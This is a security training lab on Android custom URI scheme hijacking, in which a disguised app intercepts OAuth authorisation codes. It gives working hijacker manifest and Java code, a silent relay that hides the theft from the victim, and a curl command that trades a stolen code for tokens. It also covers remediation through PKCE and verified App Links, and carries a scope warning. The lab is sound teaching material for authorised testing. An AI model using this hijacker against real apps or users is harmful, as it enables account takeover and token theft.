# Lab 03 — Scheme hijacking: stealing an authorisation code with a competing app

**Difficulty:** Advanced
**Time:** 2–4 hours
**Prerequisites:** [Lab 01](lab-01-intercept-the-flow.md), [Lab 02](lab-02-pkce-enforcement.md),
[Chapter 45 §3.10.1, §4.3, §5.1, §7.6](../README.md), [26-Intent](../../26-Intent/README.md)

---

## Objective

Build, install and run an application that registers the target's OAuth redirect scheme, intercept a
real authorisation code during a genuine login, and then — by chaining with Lab 02 — demonstrate
whether that code converts into account takeover.

The point is not that interception is clever. It takes about fifteen lines of code. The point is that
**it is this easy**, that the target app cannot detect it, and that whether it *matters* is decided
entirely by a server setting the app has no control over.

> **⚠️ Warning — scope**
> Perform this only against an app and account you own, or a target you have written authorisation to
> test. Intercepting another person's authorisation code is unauthorised access to a computer system
> in essentially every jurisdiction, and the fact that it is trivially easy is not a defence. Build
> the hijacker as a debug-signed APK, keep it on a test device, and uninstall it afterwards.

---

## Background: why this works

Android imposes **no uniqueness constraint on custom URI schemes**. When a redirect such as
`exampleapp://oauth/callback` fires, the platform resolves it through
`IntentFilter.matchData` in `frameworks/base/core/java/android/content/IntentFilter.java`, which
compares scheme, host, port and path against every installed app's declared filters. That method has
no concept of ownership, no registry, and no first-claim priority. Any app may declare any scheme.

With two matching activities, the platform may present a disambiguation dialog — which most users tap
through without reading — and if the user has previously chosen "always" for one app, or if the
resolution ordering favours the attacker, no dialog appears at all.

**App Links are the platform's answer.** An `https://` redirect whose host serves an
`assetlinks.json` naming your package and signing certificate *is* exclusive, because the platform
fetches and verifies that file over TLS. Verification state is observable:

```bash
# host
adb shell pm get-app-links com.example.target
```

---

## Step 1 — Establish the baseline

Before you build anything, prove there is something to compete for.

```bash
# host — how many activities claim this redirect right now?
adb shell cmd package query-activities \
  -a android.intent.action.VIEW -d "exampleapp://oauth/callback"
```

**Q1.** How many activities are listed? Record the output — this is your "before" evidence.

```bash
# host — if the target uses an https redirect, check verification instead
adb shell pm get-app-links com.example.target
```

**Q2.** If it is an App Link, does it say `verified`? If it says `legacy_failure`, `none` or a retry
code, the app *believes* it has exclusivity and does not — which is a finding on its own, and it
means this lab still applies.

---

## Step 2 — Build the hijacker

A complete skeleton is in [`../examples/scheme-hijacker/`](../examples/scheme-hijacker/). The whole
attack is a manifest entry and one activity.

**`AndroidManifest.xml`** — the entire offensive capability lives here:

```xml
<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="com.research.hijacker">

    <application android:label="Photo Filters" android:allowBackup="false">
        <activity
            android:name=".HijackActivity"
            android:exported="true"
            android:noHistory="true"
            android:excludeFromRecents="true"
            android:theme="@android:style/Theme.NoDisplay">

            <intent-filter android:priority="999">
                <action   android:name="android.intent.action.VIEW" />
                <category android:name="android.intent.category.DEFAULT" />
                <category android:name="android.intent.category.BROWSABLE" />
                <!-- The target's redirect scheme. Nothing stops us declaring it. -->
                <data android:scheme="exampleapp" android:host="oauth" />
            </intent-filter>
        </activity>
    </application>
</manifest>
```

Four details make this realistic rather than a toy:

| Attribute | Why an attacker uses it |
|---|---|
| `android:label="Photo Filters"` | The disambiguation dialog shows the label, not the package. A plausible name is more likely to be tapped |
| `android:theme="@android:style/Theme.NoDisplay"` | No visible UI, so the user sees nothing happen |
| `android:noHistory="true"` | Nothing left in the back stack |
| `android:excludeFromRecents="true"` | Nothing in the recents screen |
| `android:priority="999"` | Priority influences ordering in some resolution paths; do not rely on it, but attackers set it |

**`HijackActivity.java`** — the theft:

```java
package com.research.hijacker;

import android.app.Activity;
import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import android.util.Log;

public class HijackActivity extends Activity {
    private static final String TAG = "STOLEN";

    @Override protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        Uri data = getIntent().getData();
        if (data != null) {
            Log.w(TAG, "full callback: " + data);
            Log.w(TAG, "code  = " + data.getQueryParameter("code"));
            Log.w(TAG, "state = " + data.getQueryParameter("state"));
        }

        // A real attacker would exfiltrate here and then relay the intent onward to the
        // legitimate app so the victim's login appears to succeed normally.
        finish();
    }
}
```

Build and install:

```bash
# host
./gradlew assembleDebug
adb install -r app/build/outputs/apk/debug/app-debug.apk
```

---

## Step 3 — Prove the collision exists

```bash
# host — the "after" evidence
adb shell cmd package query-activities \
  -a android.intent.action.VIEW -d "exampleapp://oauth/callback"
```

**Q3.** How many activities are listed now? The before/after diff is your proof that the scheme is not
exclusive, and it takes two commands.

---

## Step 4 — Intercept a real code

```bash
# host
adb logcat -c
adb logcat -s STOLEN:W
```

Now perform a genuine login in the **target** app.

**Q4.** Did a disambiguation dialog appear? What did it say? Take a screenshot — a dialog offering
"Photo Filters" or "Example Bank" to a user mid-login is compelling report evidence on its own.

**Q5.** Did your logcat filter print a `code=` value? If yes, you have intercepted a live
authorisation code belonging to a real login.

**Q6.** What happened to the target app? Did it hang waiting for a callback it never received?

### If no dialog appeared and the target got the callback

Good — investigate why, because the answer is the finding.

- Is the redirect a **verified App Link**? Then the platform routed it exclusively and correctly. Your
  hijacker never had a chance, and that is exactly the mitigation working. Note it as a positive.
- Did the user previously set "always" for the target? Clear it and retry:
  ```bash
  # host
  adb shell pm clear-app-links com.example.target
  adb shell pm set-app-links --package com.example.target 0 all
  ```
- Is the target using a Custom Tab whose redirect resolves inside the browser rather than through the
  platform? Check whether the browser has its own handler preference.

### If a dialog appeared and the user must choose

That *is* the finding. The security of the flow now rests on a user correctly identifying which of
two similarly-named apps should receive their bank's login callback, mid-login, under time pressure.
That is not a security control.

---

## Step 5 — The relay refinement

An interception that breaks the login is noticed. A real attacker forwards the callback so the
victim's login completes normally and nothing appears wrong.

```java
// inside HijackActivity, after logging the code
Intent relay = new Intent(Intent.ACTION_VIEW, data);
relay.setPackage("com.example.target");    // deliver explicitly to the real app
relay.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
try {
    startActivity(relay);
} catch (Exception e) {
    Log.w(TAG, "relay failed: " + e);
}
```

**Q7.** With the relay in place, does the victim's login complete normally? Is there *any* observable
difference from the user's point of view?

**Q8.** What could the target app do to detect that this happened? Think carefully before answering —
the honest answer is "essentially nothing", and understanding why is the point.

---

## Step 6 — Chain it: does the stolen code become tokens?

This is where the lab turns from a demonstration into a severity rating.

Take the intercepted code and run [Lab 02](lab-02-pkce-enforcement.md)'s **variant B** against it —
the exchange with **no** `code_verifier`, because as the attacker that is all you have. You never saw
the verifier; it never left the legitimate app's memory.

```bash
# host — the attacker's position: a code, no verifier
curl -s -w '\nHTTP %{http_code}\n' -X POST "$TOKEN_EP" \
  -d grant_type=authorization_code \
  -d code="$STOLEN_CODE" \
  -d redirect_uri="exampleapp://oauth/callback" \
  -d client_id="$CLIENT_ID"
```

| Result | Meaning | Severity |
|---|---|---|
| `400 invalid_grant` | PKCE is enforced. The stolen code is inert. | 🟡 Medium — fix the redirect, but there is no takeover |
| `200` with tokens | PKCE is not enforced. **You have taken over the account** with an app the user installed for photo filters. | 🔴 Critical |

**Q9.** Which happened? If tokens came back, use one against the API to demonstrate access, and note
that the refresh token gives you persistence that survives a password change.

---

## Step 7 — The remediation, as code

Write the fix, do not just name it.

**Server side** — the control that matters:

```
Authorization server configuration:
  require_pkce = true              # reject any code exchange lacking a verifier
  pkce_methods = ["S256"]          # refuse `plain`
  code_single_use = true
  code_lifetime = 60s
```

**Client side** — move to a verified App Link:

```xml
<!-- AndroidManifest.xml -->
<activity android:name=".OAuthCallbackActivity" android:exported="true">
    <intent-filter android:autoVerify="true">
        <action   android:name="android.intent.action.VIEW" />
        <category android:name="android.intent.category.DEFAULT" />
        <category android:name="android.intent.category.BROWSABLE" />
        <data android:scheme="https"
              android:host="login.example.com"
              android:path="/android/callback" />
    </intent-filter>
</activity>
```

**Server side, hosting the verification file** at
`https://login.example.com/.well-known/assetlinks.json`:

```json
[{
  "relation": ["delegate_permission/common.handle_all_urls"],
  "target": {
    "namespace": "android_app",
    "package_name": "com.example.target",
    "sha256_cert_fingerprints": ["AB:CD:EF:..."]
  }
}]
```

Then verify the fix actually took effect — declaring `autoVerify` is not verification:

```bash
# host
adb shell pm verify-app-links --re-verify com.example.target
adb shell pm get-app-links com.example.target        # must show `verified`
```

**Q10.** Re-run step 4 with the App Link in place and the hijacker still installed. Does your hijacker
receive anything now? Why not, mechanically?

---

## Success criteria

- [ ] Baseline `query-activities` output captured **before** installing the hijacker
- [ ] Hijacker built, installed, and the "after" output shows the collision
- [ ] A live authorisation code was intercepted and logged, from a genuine login
- [ ] Any disambiguation dialog was screenshotted
- [ ] The relay refinement was implemented and the victim's login completed normally
- [ ] The stolen code was taken to the token endpoint **without a verifier** and the result recorded
- [ ] The severity rating is justified by the *combination* of redirect type and PKCE enforcement
- [ ] The remediation was written as manifest XML, `assetlinks.json` and server configuration
- [ ] `pm get-app-links` was used to confirm the remediation actually verified
- [ ] The hijacker was uninstalled from the test device

---

## Debrief

1. Name the exact AOSP method that permits this, and state precisely what it does *not* check.
2. Your hijacker and the real app both claim the scheme. List every factor that determines which one
   receives the intent.
3. The target app's developers ask what code change would detect the hijacker. Answer honestly.
4. Explain why the same attack is impossible against a verified App Link, in terms of what the
   platform fetches and checks.
5. You found the collision but PKCE was enforced. Write the finding, including the severity and the
   reason it is not Critical.
6. You found the collision and PKCE was not enforced. Write the finding, including the impact sentence
   and the two artefacts you would attach.
7. An App Link is declared with `autoVerify="true"` but `pm get-app-links` shows `legacy_failure`.
   What has happened, what is the user-visible effect, and what severity does that carry?
8. Why is the correct fix *both* the App Link and the server-side PKCE enforcement rather than either
   one? Frame the answer in terms of layers and enforcement points.
